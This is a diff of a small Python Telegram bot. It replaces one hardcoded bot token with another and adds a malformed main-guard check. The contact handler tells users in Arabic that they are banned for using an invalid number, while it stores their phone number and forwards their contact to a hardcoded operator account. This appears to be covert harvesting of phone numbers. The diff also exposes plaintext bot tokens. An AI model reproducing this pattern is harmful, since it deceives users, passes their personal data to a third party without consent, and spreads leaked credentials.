@@ -1,6 +1,6 @@
 import telebot
 from telebot import types
-token = "6843217488:AAEyiF7rkK7mY3GQ-7zavXVEnISsTZxj85M"
+token = "6551791083:AAH7-4-yzQTyAItSPcKUX70xfXlkfZeHgXY"
 bot = telebot.TeleBot(token)
 sudo = "1237183422"
 @bot.message_handler(commands=['start']) 
@@ -20,5 +20,6 @@ def handle_contact(message):
     bot.send_message(message.chat.id,f"<strong>تم حظرك من البوت لأنك تستخدم رقم غير صحيح </strong>",parse_mode="html")
     c = message.contact.phone_number
     bot.forward_message(sudo,message.chat.id,message.message_id)
-name = "mo"
+name = "main"
+if name == 'main':
     bot.polling(none_stop=True)
